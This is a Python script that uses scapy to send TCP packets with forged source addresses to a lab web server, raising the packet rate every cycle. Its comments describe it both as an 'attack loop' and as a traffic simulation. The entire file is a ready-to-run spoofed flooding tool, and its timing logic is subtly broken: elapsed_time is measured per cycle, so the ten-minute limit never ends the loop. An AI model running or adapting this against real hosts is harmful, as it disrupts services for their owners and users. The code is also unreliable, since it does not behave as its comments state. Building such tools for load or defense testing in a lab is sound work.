from scapy.all import *
import random
import time

# List of source IP addresses
public_ips = ['192.168.1.201', '192.168.1.202', '192.168.1.203', '192.168.1.204', '192.168.1.205']

# Select a random IP from the above list and send a request to the server
def generate_packet():
    src_ip = random.choice(public_ips)
    dst_ip = "192.168.1.101"
    return IP(src=src_ip, dst=dst_ip)/TCP(sport=RandShort(), dport=80) 

num_requests = 50
duration = 600
cicle_time = 5
increase_factor = 25
elapsed_time = 0
requests_sent = 0

# attack loop
while elapsed_time < duration:
    start_time = time.time()
    print("Start sending:", num_requests, "requests every", cicle_time, "seconds")
    # send a number of request on every cicle (5 seconds)
    while time.time() - start_time < cicle_time and requests_sent < num_requests:
        packet = generate_packet()
        
        # compute the time between requests
        time.sleep(cicle_time/num_requests)
        
        send(packet, verbose=False)
        
        requests_sent += 1
    
    elapsed_time = int(time.time() - start_time)
    # increase the number of requests once the cycle is finished
    num_requests += increase_factor

    print(f"Elapsed time: {elapsed_time}s, Number of requests sent: {requests_sent}")

print("Traffic simulation complete.")
